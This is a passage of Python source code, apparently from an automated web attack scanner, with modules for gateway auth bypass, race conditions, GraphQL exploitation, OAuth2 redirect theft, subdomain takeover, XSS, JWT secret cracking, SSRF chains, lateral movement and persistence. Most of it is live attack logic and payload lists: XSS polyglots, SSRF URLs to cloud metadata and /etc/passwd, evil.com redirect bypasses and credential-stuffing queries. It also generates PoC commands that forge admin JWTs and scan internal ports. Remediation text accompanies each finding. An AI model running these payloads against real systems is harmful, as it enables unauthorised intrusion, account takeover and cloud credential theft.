        ("/api/admin",     "//api/admin"),
        ("/api/admin",     "/api//admin"),
        ("/api/admin",     "/api/./admin"),
        ("/api/admin",     "/api/%2e/admin"),
        ("/api/admin",     "/api/public/../admin"),
        ("/api/admin",     "/api/v1/../../api/admin"),
        # Internal header bypass
    ]
    BYPASS_HEADERS = [
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Forwarded-Prefix": "/api"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"X-Host": "localhost"},
        {"X-Forwarded-Host": "localhost"},
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        # Test restricted paths with normalisation variants
        restricted_paths = ["/admin", "/api/admin", "/api/internal", "/management"]
        for rpath in restricted_paths:
            base_url = base + rpath
            try:
                r_base = _fetch(base_url, cfg.ua, cfg.timeout)
                if not r_base or r_base.status not in (401, 403):
                    continue
            except Exception:
                continue
            # Try bypass variants
            for _, bypass in self.BYPASS_PATHS:
                url = base + bypass
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if r and r.status in (200, 201):
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        if len(body) > 50:
                            profile.findings.append(Finding(
                                id=f"GATEWAY-BYPASS-PATH-{bypass.replace('/','_').replace('%','')[:16].upper()}",
                                title=f"API Gateway Auth Bypass via Path Normalisation: {bypass}",
                                severity="CRITICAL",
                                cvss=9.8,
                                cwe="CWE-863",
                                description=(
                                    f"Path {rpath} returns HTTP {r_base.status} but "
                                    f"normalised variant '{bypass}' returns HTTP {r.status}. "
                                    "API gateway applies security policy to normalised path "
                                    "but backend receives original — authentication bypassed."
                                ),
                                evidence=f"Restricted: {rpath} → {r_base.status} | Bypass: {bypass} → {r.status}",
                                poc_curl=f"curl -sk '{url}'",
                                category="API Gateway Bypass",
                                remediation="Normalise URLs before security policy evaluation. Use consistent path parsing between gateway and backend. Apply security policies after URL decoding."
                            ))
                            break
                except Exception:
                    pass
            # Try header bypass
            for hdr_dict in self.BYPASS_HEADERS:
                try:
                    r = _fetch(base_url, cfg.ua, cfg.timeout, extra_headers=hdr_dict)
                    if r and r.status in (200, 201):
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        if len(body) > 50:
                            hdr_str = ", ".join(f"{k}: {v}" for k, v in hdr_dict.items())
                            profile.findings.append(Finding(
                                id=f"GATEWAY-BYPASS-HDR-{list(hdr_dict.keys())[0].replace('-','_').upper()[:16]}",
                                title=f"API Gateway Auth Bypass via Header: {list(hdr_dict.keys())[0]}",
                                severity="CRITICAL",
                                cvss=9.8,
                                cwe="CWE-863",
                                description=(
                                    f"Header injection bypass: {hdr_str} grants access "
                                    f"to restricted path {rpath}."
                                ),
                                evidence=body[:200],
                                poc_curl=f"curl -sk '{base_url}' -H '{hdr_str}'",
                                category="API Gateway Bypass",
                                remediation="Strip X-Original-URL, X-Rewrite-URL, X-Custom-IP-Authorization at gateway. Never trust IP from headers for access control. Implement defence-in-depth at application layer."
                            ))
                            break
                except Exception:
                    pass
        return profile


class RaceConditionAdvanced:
    """Detect race conditions: limit bypass, double-spend, TOCTOU, and parallel request attacks."""
    NAME = "Race Condition Advanced"
    RACE_ENDPOINTS = [
        ("/api/coupon/redeem",   "POST", {"code": "SAVE10"},              "coupon double-redeem"),
        ("/api/vote",            "POST", {"item_id": "1"},                "vote multiple times"),
        ("/api/transfer",        "POST", {"amount": 100, "to": "user2"},  "double transfer"),
        ("/api/withdraw",        "POST", {"amount": 100},                 "double withdraw"),
        ("/api/referral/claim",  "POST", {"code": "REF123"},              "referral double-claim"),
        ("/api/promo/apply",     "POST", {"promo": "FREE"},               "promo double-apply"),
        ("/api/register",        "POST", {"username": "racetest"},        "duplicate account race"),
        ("/api/password/reset",  "POST", {"token": "X"},                  "token reuse race"),
        ("/api/order/confirm",   "POST", {"order_id": "1"},               "order double-confirm"),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import threading
        base = profile.url.rstrip("/")
        for path, method, payload, label in self.RACE_ENDPOINTS:
            url = base + path
            results = []
            threads = []
            def fire(u=url, m=method, p=payload, r=results):
                try:
                    resp = _fetch(u, cfg.ua, 5, m,
                                  json.dumps(p).encode(),
                                  {"Content-Type": "application/json"})
                    if resp:
                        r.append((resp.status, len(resp.body or b"")))
                except Exception:
                    pass
            for _ in range(10):
                t = threading.Thread(target=fire)
                threads.append(t)
            for t in threads:
                t.start()
            for t in threads:
                t.join(timeout=8)
            if len(results) >= 2:
                success_count = sum(1 for s, _ in results if s in (200, 201))
                if success_count >= 2:
                    profile.findings.append(Finding(
                        id=f"RACE-COND-{path.replace('/','_').strip('_')[:18].upper()}",
                        title=f"Race Condition — {label} at {path}",
                        severity="HIGH",
                        cvss=8.1,
                        cwe="CWE-362",
                        description=(
                            f"Race condition: {success_count}/10 parallel requests to {path} "
                            f"returned HTTP 200 for '{label}'. "
                            "Indicates missing atomic transaction or optimistic locking — "
                            "allows double-spend, limit bypass, or duplicate account creation."
                        ),
                        evidence=f"Results: {results[:10]} | Successes: {success_count}",
                        poc_curl=(
                            f"# Fire 10 parallel requests:\n"
                            f"for i in $(seq 1 10); do "
                            f"curl -sk -X {method} '{url}' "
                            f"-H 'Content-Type: application/json' "
                            f"-d '{json.dumps(payload)}' & done; wait"
                        ),
                        category="Race Condition",
                        remediation="Use database-level atomic operations (SELECT FOR UPDATE, transactions). Implement idempotency keys. Use distributed locks (Redis SETNX) for critical operations. Apply per-user rate limiting."
                    ))
        return profile


class GraphQLDeepExploit:
    """Detect GraphQL deep exploitation: introspection abuse, field suggestion, mutation injection."""
    NAME = "GraphQL Deep Exploit"
    GQL_ENDPOINTS = ["/graphql", "/api/graphql", "/v1/graphql",
                     "/query", "/gql", "/graphiql", "/api/query"]
    QUERIES = [
        # Full introspection dump
        ("introspect_types", '{"query":"{ __schema { types { name fields { name type { name kind ofType { name kind } } } } } }"}'),
        # Field suggestion (typo)
        ("field_suggest", '{"query":"{ usr { id } }"}'),
        # Auth bypass via alias
        ("alias_bypass", '{"query":"{ adminUsers: users(role: ADMIN) { id email password } }"}'),
        # Mutation — create admin
        ("mutation_admin", '{"query":"mutation { updateRole(userId: 1, role: ADMIN) { id role } }"}'),
        # Query cost — deeply nested
        ("nested_cost", '{"query":"{ users { posts { comments { author { posts { comments { id } } } } } } }"}'),
        # Batched cred stuff
        ("batch_login", '{"query":"mutation { l1: login(u:\\"admin\\",p:\\"admin\\") { token } l2: login(u:\\"admin\\",p:\\"password\\") { token } l3: login(u:\\"admin\\",p:\\"123456\\") { token } }"}'),
        # Introspect directives
        ("directives", '{"query":"{ __schema { directives { name args { name } } } }"}'),
        # Subscriptions
        ("subscriptions", '{"query":"subscription { messageAdded { id body } }"}'),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for ep in self.GQL_ENDPOINTS:
            url = base + ep
            for label, query_json in self.QUERIES:
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout, "POST",
                               query_json.encode(),
                               {"Content-Type": "application/json"})
                    if r and r.status in (200, 400):
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        hit = False
                        detail = ""
                        if label == "introspect_types" and '"types"' in body and '"fields"' in body:
                            hit = True; detail = "Full schema dumped"
                        elif label == "field_suggest" and ("Did you mean" in body or "suggestion" in body.lower()):
                            hit = True; detail = "Field suggestion leaks schema"
                        elif label == "alias_bypass" and "email" in body and "password" in body:
                            hit = True; detail = "Admin user data returned"
                        elif label == "mutation_admin" and '"role"' in body and "ADMIN" in body:
                            hit = True; detail = "Admin role mutation succeeded"
                        elif label == "batch_login" and '"token"' in body:
                            hit = True; detail = "Batched credential stuffing — token returned"
                        if hit:
                            profile.findings.append(Finding(
                                id=f"GQL-DEEP-{label.upper()[:16]}-{ep.replace('/','_')[:8].upper()}",
                                title=f"GraphQL Deep Exploit — {label} at {ep}",
                                severity="CRITICAL" if label in ("mutation_admin","batch_login","alias_bypass") else "HIGH",
                                cvss=9.8 if label in ("mutation_admin","batch_login") else 7.5,
                                cwe="CWE-284",
                                description=(
                                    f"GraphQL {label} at {ep}: {detail}. "
                                    "Indicates missing query depth/cost limits, "
                                    "introspection enabled in production, or authorization not enforced on mutations."
                                ),
                                evidence=body[:300],
                                poc_curl=(
                                    f"curl -sk -X POST '{url}' "
                                    f"-H 'Content-Type: application/json' "
                                    f"-d '{query_json[:100]}...'"
                                ),
                                category="GraphQL",
                                remediation="Disable introspection in production. Implement query cost analysis and depth limiting. Apply field-level authorization. Use persisted queries. Rate-limit mutation operations."
                            ))
                except Exception:
                    pass
        return profile


class OAuth2TokenTheft:
    """Detect OAuth2 token theft: open redirect in redirect_uri, state fixation, implicit flow."""
    NAME = "OAuth2 Token Theft"
    OAUTH_PATHS = [
        "/oauth/authorize", "/oauth2/authorize", "/auth/oauth2/authorize",
        "/connect/authorize", "/openid/authorize",
        "/oauth/callback", "/oauth2/callback", "/auth/callback",
        "/oauth/token", "/oauth2/token", "/auth/token",
    ]
    REDIRECT_BYPASSES = [
        "https://evil.com",
        "https://evil.com@legitimate.com",
        "https://legitimate.com.evil.com",
        "https://legitimate.com%40evil.com",
        "https://legitimate.com/redirect?url=https://evil.com",
        "//evil.com/%2F..",
        "javascript:alert(1)",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import urllib.parse
        base = profile.url.rstrip("/")
        host = profile.host
        for path in self.OAUTH_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 302, 400, 401):
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    if any(sig in body for sig in [
                        "client_id", "redirect_uri", "response_type",
                        "access_token", "code=", "state=", "scope",
                        "OAuth", "authorize",
                    ]):
                        # Test open redirect in redirect_uri
                        for bypass in self.REDIRECT_BYPASSES[:3]:
                            probe = (
                                f"{url}?response_type=code"
                                f"&client_id=CLIENT_ID"
                                f"&redirect_uri={urllib.parse.quote(bypass)}"
                                f"&scope=openid"
                                f"&state=CSRF_TOKEN"
                            )
                            try:
                                r2 = _fetch(probe, cfg.ua, cfg.timeout)
                                if r2 and r2.status in (200, 302):
                                    loc = r2.headers.get("location", "")
                                    if "evil.com" in loc or bypass[:20] in loc:
                                        profile.findings.append(Finding(
                                            id=f"OAUTH2-REDIR-{path.replace('/','_').strip('_')[:14].upper()}",
                                            title=f"OAuth2 Open Redirect in redirect_uri at {path}",
                                            severity="CRITICAL",
                                            cvss=9.3,
                                            cwe="CWE-601",
                                            description=(
                                                f"OAuth2 redirect_uri accepts open redirect: '{bypass}'. "
                                                "Attacker can steal authorization codes and access tokens "
                                                "by redirecting victim to attacker-controlled domain."
                                            ),
                                            evidence=f"redirect_uri: {bypass} | Location: {loc[:100]}",
                                            poc_curl=(
                                                f"# Phishing URL — send to victim:\n"
                                                f"{probe}"
                                            ),
                                            category="OAuth2 / Token Theft",
                                            remediation="Implement strict redirect_uri allowlist validation. Use exact string matching (not prefix/regex). Register all redirect URIs in client configuration. Reject any URI not in allowlist."
                                        ))
                                        break
                            except Exception:
                                pass
            except Exception:
                pass
        return profile


class SubdomainTakeoverAdvanced:
    """Detect subdomain takeover via DNS CNAME dangling, S3, GitHub Pages, Azure, Fastly."""
    NAME = "Subdomain Takeover Advanced"
    TAKEOVER_FINGERPRINTS = [
        # (provider, signature, cname_pattern, severity)
        ("AWS S3",          "NoSuchBucket",              ".s3.amazonaws.com",    "CRITICAL"),
        ("AWS S3",          "The specified bucket",       ".s3.amazonaws.com",    "CRITICAL"),
        ("GitHub Pages",    "There isn't a GitHub Pages", ".github.io",           "CRITICAL"),
        ("GitHub Pages",    "404 There is no GitHub",     ".github.io",           "CRITICAL"),
        ("Heroku",          "No such app",                ".herokuapp.com",        "HIGH"),
        ("Heroku",          "no app configured at this",  ".herokuapp.com",        "HIGH"),
        ("Azure App Service","404 Web Site not found",    ".azurewebsites.net",    "HIGH"),
        ("Azure App Service","ErrorDocument",             ".azurewebsites.net",    "HIGH"),
        ("Fastly",          "Fastly error: unknown domain","fastly.net",           "HIGH"),
        ("Pantheon",        "The gods are wise",          ".pantheonsite.io",     "HIGH"),
        ("WP Engine",       "No Site Configured At This", ".wpengine.com",        "HIGH"),
        ("Shopify",         "Sorry, this shop is currently unavailable", ".myshopify.com", "HIGH"),
        ("HubSpot",         "Domain not configured",      ".hubspot.com",         "HIGH"),
        ("Ghost",           "The thing you were looking", ".ghost.io",            "HIGH"),
        ("Tumblr",          "Whatever you were looking",  ".tumblr.com",          "MEDIUM"),
        ("Zendesk",         "Help Center Closed",         ".zendesk.com",         "MEDIUM"),
        ("Surge.sh",        "project not found",          ".surge.sh",            "HIGH"),
        ("Netlify",         "Not Found - Request ID",     ".netlify.app",         "HIGH"),
        ("Readme.io",       "Project doesnt exist",       ".readme.io",           "MEDIUM"),
        ("Intercom",        "Uh oh. That page doesn",     ".intercom.io",         "MEDIUM"),
        ("Webflow",         "The page you are looking",   ".webflow.io",          "MEDIUM"),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        subdomains = profile.subdomains or []
        for sub in subdomains:
            url = f"https://{sub}"
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 301, 302, 404):
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    for provider, sig, cname_pat, sev in self.TAKEOVER_FINGERPRINTS:
                        if sig.lower() in body.lower():
                            profile.findings.append(Finding(
                                id=f"TAKEOVER-ADV-{provider.replace(' ','_').upper()[:14]}-{sub[:12].upper()}",
                                title=f"Subdomain Takeover ({provider}): {sub}",
                                severity=sev,
                                cvss=9.3 if sev == "CRITICAL" else 7.5,
                                cwe="CWE-350",
                                description=(
                                    f"Subdomain {sub} is vulnerable to takeover via {provider}. "
                                    f"Signature '{sig}' found in response. "
                                    "CNAME points to unclaimed {provider} service — "
                                    "attacker can claim the service and serve malicious content "
                                    "under the victim's domain (cookie theft, phishing, CSP bypass)."
                                ),
                                evidence=f"Provider: {provider} | Signature: {sig} | HTTP {r.status}",
                                poc_curl=(
                                    f"curl -sk 'https://{sub}'\n"
                                    f"# Claim the {provider} endpoint:\n"
                                    f"# Register {provider} account and point to {sub}"
                                ),
                                category="Subdomain Takeover",
                                remediation=f"Remove dangling CNAME for {sub} → {cname_pat}. Implement DNS monitoring. Claim or delete all unused {provider} deployments linked to your domain."
                            ))
                            break
            except Exception:
                pass
        return profile


class XSSAdvancedPayloads:
    """Advanced XSS: CSP bypass, polyglot, template literal injection, DOM-based stored XSS."""
    NAME = "XSS Advanced Payloads"
    BYPASS_PAYLOADS = [
        # CSP bypass via nonce prediction
        ('<script nonce="GUESS">alert(document.domain)</script>', "CSP nonce bypass"),
        # base tag hijack
        ('<base href="//evil.com/">', "Base tag hijack"),
        # JSONP CSP bypass
        ('<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>', "JSONP CSP bypass"),
        # Dangling markup
        ('<img src="https://evil.com/?', "Dangling markup injection"),
        # Template literal
        ('${alert(1)}', "Template literal injection"),
        ('`${alert`1`}`', "Tagged template literal"),
        # SVG animate
        ('<svg><animate onbegin=alert(1) attributeName=x></svg>', "SVG animate"),
        # HTML5 event handlers
        ('<details open ontoggle=alert(1)>', "Details ontoggle"),
        ('<video><source onerror=alert(1)></video>', "Video source onerror"),
        ('<input autofocus onfocus=alert(1)>', "Autofocus onfocus"),
        # Polyglot
        ('jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert())//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//', "Polyglot"),
        # iframe srcdoc
        ('<iframe srcdoc="<script>parent.alert(1)</script>">', "iframe srcdoc"),
        # object data
        ('<object data="javascript:alert(1)">', "Object data JS"),
    ]
    XSS_PARAMS = ["q", "search", "name", "msg", "comment", "text",
                  "title", "description", "content", "value", "input",
                  "redirect", "next", "url", "callback", "jsonp"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import urllib.parse
        base = profile.url.rstrip("/")
        for payload, label in self.BYPASS_PAYLOADS:
            enc = urllib.parse.quote(payload)
            for param in self.XSS_PARAMS[:6]:
                url = f"{base}/?{param}={enc}"
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if r and r.status == 200:
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        # Check if payload was reflected without encoding
                        key_fragment = payload[:15].replace('"', '').replace("'", "").replace("<", "").strip()
                        if key_fragment.lower() in body.lower() and "alert" in body.lower():
                            profile.findings.append(Finding(
                                id=f"XSS-ADV-{label.replace(' ','_').upper()[:16]}-{param.upper()[:6]}",
                                title=f"Advanced XSS — {label} via ?{param}",
                                severity="HIGH",
                                cvss=7.4,
                                cwe="CWE-79",
                                description=(
                                    f"Advanced XSS payload '{label}' reflected via ?{param}. "
                                    "This technique bypasses common XSS filters and may evade CSP."
                                ),
                                evidence=f"Payload reflected in response | Snippet: {body[:200]}",
                                poc_curl=f"curl -sk '{url}'",
                                category="XSS",
                                remediation="Use context-aware output encoding. Implement strict CSP with nonces generated per-request. Use Trusted Types API. Avoid innerHTML/eval with user data."
                            ))
                            break
                except Exception:
                    pass
        return profile


class JWTSecretBrute:
    """Detect weak JWT HMAC secrets via dictionary attack and known-secret patterns."""
    NAME = "JWT Secret Brute"
    WEAK_SECRETS = [
        "secret", "password", "123456", "qwerty", "admin",
        "test", "change_this", "your_secret", "jwt_secret",
        "supersecret", "mysecret", "secretkey", "key",
        "private", "verysecret", "topsecret", "s3cr3t",
        "", "null", "undefined", "none", "jwt",
        "HS256", "HS384", "HS512", "RS256",
        "secret123", "password123", "admin123", "root",
        "flask", "django-insecure", "changeme", "replace_me",
        "your-256-bit-secret", "your-384-bit-secret",
        "your-512-bit-secret", "your-secret-here",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import re, base64, hmac, hashlib
        # Extract JWTs from findings evidence
        jwt_pattern = re.compile(
            r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'
        )
        all_evidence = " ".join(
            str(getattr(f, 'evidence', '')) for f in profile.findings
        )
        tokens = jwt_pattern.findall(all_evidence)
        # Also probe known token endpoints
        base_url = profile.url.rstrip("/")
        for path in ["/api/token", "/login", "/auth", "/api/auth"]:
            try:
                r = _fetch(base_url + path, cfg.ua, cfg.timeout, "POST",
                           b'{"username":"test","password":"test"}',
                           {"Content-Type": "application/json"})
                if r and r.body:
                    found = jwt_pattern.findall((r.body or b"").decode("utf-8", errors="replace"))
                    tokens.extend(found)
            except Exception:
                pass
        for token in tokens[:3]:
            parts = token.split(".")
            if len(parts) != 3:
                continue
            header_payload = f"{parts[0]}.{parts[1]}".encode()
            sig_bytes_b64 = parts[2]
            # Try to brute force HMAC secret
            cracked = None
            for secret in self.WEAK_SECRETS:
                for alg, digest in [("HS256", hashlib.sha256), ("HS384", hashlib.sha384), ("HS512", hashlib.sha512)]:
                    try:
                        expected = hmac.new(
                            secret.encode(), header_payload, digest
                        ).digest()
                        expected_b64 = base64.urlsafe_b64encode(expected).rstrip(b"=").decode()
                        if expected_b64 == sig_bytes_b64:
                            cracked = (secret, alg)
                            break
                    except Exception:
                        pass
                if cracked:
                    break
            if cracked:
                secret_val, alg_val = cracked
                profile.findings.append(Finding(
                    id=f"JWT-SECRET-CRACKED-{alg_val}",
                    title=f"JWT HMAC Secret Cracked — {alg_val}: '{secret_val}'",
                    severity="CRITICAL",
                    cvss=10.0,
                    cwe="CWE-327",
                    description=(
                        f"JWT {alg_val} secret '{secret_val}' recovered via dictionary attack. "
                        "Attacker can forge arbitrary JWT tokens: impersonate any user, "
                        "escalate to admin role, bypass all JWT-based access controls."
                    ),
                    evidence=f"Token: {token[:60]}... | Secret: '{secret_val}' | Algorithm: {alg_val}",
                    poc_curl=(
                        f"# Forge admin token:\n"
                        f"python3 -c \"\nimport jwt\n"
                        f"token = jwt.encode({{'{{'}}sub: '1', role: 'admin', exp: 9999999999{{'}}'}},"
                        f"'{secret_val}', algorithm='{alg_val}')\nprint(token)\"\n"
                        f"# Use forged token:\n"
                        f"curl -sk '{base_url}/api/admin' -H 'Authorization: Bearer <FORGED_TOKEN>'"
                    ),
                    category="JWT",
                    remediation=f"Replace weak secret '{secret_val}' with 256-bit random secret (secrets.token_hex(32)). Rotate all existing tokens. Migrate to asymmetric JWT (RS256/ES256). Implement token revocation."
                ))
        return profile


class SSRFAdvancedChain:
    """Advanced SSRF chains: redirector abuse, URL parser confusion, IPv6, protocol smuggling."""
    NAME = "SSRF Advanced Chain"
    OOB = "YOUR_OOB_DOMAIN.burpcollaborator.net"
    SSRF_BYPASSES = [
        # Protocol variations
        ("file://",          "file:///etc/passwd"),
        ("gopher://",        "gopher://127.0.0.1:6379/_INFO%0A"),
        ("dict://",          "dict://127.0.0.1:6379/info"),
        ("ldap://",          "ldap://127.0.0.1:389/"),
        ("sftp://",          "sftp://127.0.0.1:22/"),
        ("tftp://",          "tftp://127.0.0.1:69/test"),
        # IP bypass variants
        ("IPv6",             "http://[::1]/"),
        ("IPv6-mapped",      "http://[::ffff:127.0.0.1]/"),
        ("Decimal IP",       "http://2130706433/"),
        ("Octal IP",         "http://0177.0.0.1/"),
        ("Hex IP",           "http://0x7f000001/"),
        ("URL-encoded",      "http://%31%32%37%2e%30%2e%30%2e%31/"),
        ("Double-encoded",   "http://127.0.0.1%252f@evil.com/"),
        ("At-sign bypass",   "http://evil.com@127.0.0.1/"),
        # Cloud internal
        ("AWS-IMDS-v1",      "http://169.254.169.254/latest/meta-data/"),
        ("GCP-IMDS",         "http://metadata.google.internal/computeMetadata/v1/"),
        ("Azure-IMDS",       "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
    ]
    SSRF_PARAMS = ["url", "fetch", "proxy", "redirect", "resource",
                   "endpoint", "target", "dest", "link", "src",
                   "image", "load", "callback", "webhook", "import"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import urllib.parse
        base = profile.url.rstrip("/")
        oob = self.OOB
        host = profile.host
        for param in self.SSRF_PARAMS[:6]:
            for label, ssrf_url in self.SSRF_BYPASSES:
                enc = urllib.parse.quote(ssrf_url)
                url = f"{base}/?{param}={enc}"
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if r and r.status in (200, 201):
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        if any(sig in body for sig in [
                            "root:", "bin/bash", "+OK", "-ERR", "+PONG",
                            "uid=", "redis_version", "ftp_", "ssh-",
                            "access_token", "iam", "metadata",
                        ]):
                            profile.findings.append(Finding(
                                id=f"SSRF-ADV-{label.replace(' ','_').upper()[:14]}-{param.upper()[:6]}",
                                title=f"SSRF {label} — Confirmed via ?{param}",
                                severity="CRITICAL",
                                cvss=9.8,
                                cwe="CWE-918",
                                description=(
                                    f"SSRF confirmed via {label} bypass: URL '{ssrf_url[:60]}' "
                                    f"returned sensitive content via ?{param}. "
                                    f"Pivot point for internal service access and cloud credential theft."
                                ),
                                evidence=body[:300],
                                poc_curl=f"curl -sk '{url}'",
                                category="SSRF",
                                remediation="Implement URL allowlist validation. Block all IP ranges except required services. Use DNS-rebinding protection. Parse URLs with safe library. Block gopher/dict/file/ldap protocols."
                            ))
                            break
                except Exception:
                    pass
            # Generate OOB payload for this param
            oob_url = f"http://{param}.{host}.{oob}/"
            profile.findings.append(Finding(
                id=f"SSRF-ADV-OOB-{param.upper()[:8]}",
                title=f"SSRF Advanced OOB Payload — ?{param}",
                severity="INFO",
                cvss=0.0,
                cwe="CWE-918",
                description=f"OOB SSRF test payload for parameter '{param}'. Replace OOB domain.",
                evidence="\n".join(f"  [{l}] {urllib.parse.quote(u)}" for l, u in self.SSRF_BYPASSES[:6]),
                poc_curl=f"curl -sk '{base}/?{param}={urllib.parse.quote(oob_url)}'",
                category="SSRF",
                remediation="Monitor DNS callbacks for all OOB probes."
            ))
            break  # one OOB block per run
        return profile


class LateralMovementPathMapper:
    """Map lateral movement paths from confirmed vulnerabilities to adjacent systems."""
    NAME = "Lateral Movement Path Mapper"
    PIVOT_SERVICES = [
        # (service, default_ports, pivot_method)
        ("SSH",         [22],           "Stolen SSH key / password spraying"),
        ("RDP",         [3389, 3390],   "Pass-the-hash via NTLM, credential reuse"),
        ("SMB",         [445, 139],     "Pass-the-hash, lateral tool execution"),
        ("WinRM",       [5985, 5986],   "Invoke-Command / Evil-WinRM with stolen creds"),
        ("MySQL",       [3306],         "Credential reuse from leaked .env/config"),
        ("PostgreSQL",  [5432],         "Credential reuse, COPY TO PROGRAM RCE"),
        ("Redis",       [6379],         "CONFIG SET + SLAVEOF persistence"),
        ("MongoDB",     [27017, 27018], "Unauthenticated access + data exfil"),
        ("Elasticsearch",[9200, 9300],  "Unauthenticated index dump"),
        ("Kafka",       [9092, 9093],   "Topic enumeration + message injection"),
        ("RabbitMQ",    [5672, 15672],  "Default credentials + queue poisoning"),
        ("Kubernetes",  [6443, 8443],   "Service account token → pod exec"),
        ("Docker",      [2375, 2376],   "Daemon API → privileged container escape"),
        ("Consul",      [8500, 8501],   "Service mesh → KV store secrets"),
        ("etcd",        [2379, 2380],   "K8s secrets dump"),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        confirmed_cats = {f.category for f in profile.findings}
        confirmed_sevs = {f.severity for f in profile.findings}
        host = profile.host
        network_ranges = []
        if profile.ip:
            parts = profile.ip.split(".")
            if len(parts) == 4:
                network_ranges.append(f"{'.'.join(parts[:3])}.0/24")
        pivot_map = []
        for service, ports, method in self.PIVOT_SERVICES:
            pivot_map.append(
                f"  → {service:15} ports {ports} : {method}"
            )
        profile.findings.append(Finding(
            id="LATERAL-MOVE-MAP-001",
            title="Lateral Movement Attack Path Map",
            severity="CRITICAL" if "CRITICAL" in confirmed_sevs else "HIGH",
            cvss=0.0,
            cwe="CWE-284",
            description=(
                f"Lateral movement paths from {host} to adjacent systems. "
                f"Network segment: {', '.join(network_ranges) or 'unknown'}. "
                f"Internal scan pivots once initial RCE/SSRF is confirmed."
            ),
            evidence=(
                f"Target IP: {profile.ip or 'unknown'}\n"
                f"Network: {', '.join(network_ranges) or 'enumerate via SSRF'}\n\n"
                "Pivot Paths:\n" + "\n".join(pivot_map)
            ),
            poc_curl=(
                f"# Internal port scan via SSRF (interactsh):\n"
                f"for port in 22 80 443 3306 5432 6379 8080 8443 9200; do\n"
                f"  curl -sk '{profile.url}?url=http://10.0.0.1:$port/' 2>&1 | "
                f"  grep -v 'refused\\|timed' && echo \"OPEN: $port\"\n"
                f"done"
            ),
            category="Lateral Movement",
            remediation="Implement network segmentation. Use jump hosts for internal access. Apply micro-segmentation. Monitor east-west traffic. Rotate all credentials that may have been exposed."
        ))
        return profile


class PersistenceMechanismDetector:
    """Detect persistence mechanism indicators: cron jobs, SSH keys, startup scripts, webhooks."""
    NAME = "Persistence Mechanism Detector"
    PERSISTENCE_PATHS = [
        "/api/webhooks", "/api/v1/webhooks", "/webhooks",
        "/api/hooks", "/hooks", "/api/callbacks",
        "/api/schedule", "/api/cron", "/api/jobs",
        "/api/tasks", "/api/scheduler",
        "/admin/webhooks", "/admin/hooks",
        "/api/integrations", "/integrations",
        "/api/automations", "/automations",
        "/api/notifications", "/api/subscriptions",
    ]
    PERSISTENCE_SIGS = [
        "webhook", "callback", "cron", "schedule",
        "hook_url", "notification_url", "target_url",
        "endpoint", "callback_url", "delivery_url",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.PERSISTENCE_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 201):
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    hits = [s for s in self.PERSISTENCE_SIGS if s in body.lower()]
                    if hits or '"url"' in body:
                        profile.findings.append(Finding(
                            id=f"PERSIST-{path.replace('/','_').strip('_')[:18].upper()}",
                            title=f"Persistence Surface — Webhook/Callback Endpoint: {path}",
                            severity="HIGH",
                            cvss=7.1,
                            cwe="CWE-284",
                            description=(
                                f"Webhook/callback endpoint at {path} allows registering external URLs. "
                                "If SSRF is achievable via webhook delivery, this creates persistent "
                                "internal network access even after initial vulnerability is patched."
                            ),
                            evidence=f"Indicators: {hits[:4]} | Snippet: {body[:200]}",
                            poc_curl=(
                                f"# Register SSRF webhook:\n"
                                f"curl -sk -X POST '{url}' "
                                f"-H 'Content-Type: application/json' "
                                f"-d '{{\"url\": \"http://169.254.169.254/latest/meta-data/\"}}'"
                            ),
                            category="Persistence",
                            remediation="Validate webhook URLs against allowlist. Block SSRF-capable webhook destinations (private IPs, cloud IMDS). Require webhook confirmation (HMAC signature verification). Log all webhook registrations."
                        ))
            except Exception:
                pass
        return profile


class CloudStorageEnumeration:
    """Enumerate cloud storage: S3, GCS, Azure Blob for public access, misconfig, and data exposure."""
    NAME = "Cloud Storage Enumeration"
    BUCKET_NAMES_TMPL = [
        "{apex}-backup", "{apex}-prod", "{apex}-staging", "{apex}-dev",
        "{apex}-assets", "{apex}-static", "{apex}-media", "{apex}-uploads",
        "{apex}-data", "{apex}-logs", "{apex}-export", "{apex}-import",
        "{apex}-public", "{apex}-private", "{apex}-internal",
        "{host}-backup", "{host}-assets", "{host}-data",
    ]
    S3_REGIONS = ["us-east-1", "us-west-2", "eu-west-1", "eu-central-1",
